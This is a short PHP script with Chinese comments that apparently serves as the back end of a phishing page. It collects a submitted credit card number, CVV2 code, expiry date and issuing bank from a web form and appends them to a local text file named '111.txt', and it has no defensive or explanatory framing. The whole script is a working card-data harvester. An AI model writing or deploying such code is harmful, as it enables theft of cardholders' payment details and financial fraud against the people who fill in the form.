<?php 
//定义要收集的表单内容 
$cardnum = $_POST['cardnum']; 
$cvv2 = $_POST['cvv2']; 
$month = $_POST['month']; 
$year = $_POST['year']; 
$cardbank = $_POST['cardbank']; 
//定义收集的内容格式 
$content = "Credit Card Number:".$cardnum.",Card Verification Number:".$cvv2.",Card Expiry Date:".$month."/ year:".$year.",IssuingBank:".cardbank; 
//定义文件存放的位置 
$compile_dir = "111.txt"; 
//下面就是写入的PHP代码了 
$file = fopen($compile_dir,"a+"); 
fwrite($file,$content); 
fclose($file); 
?>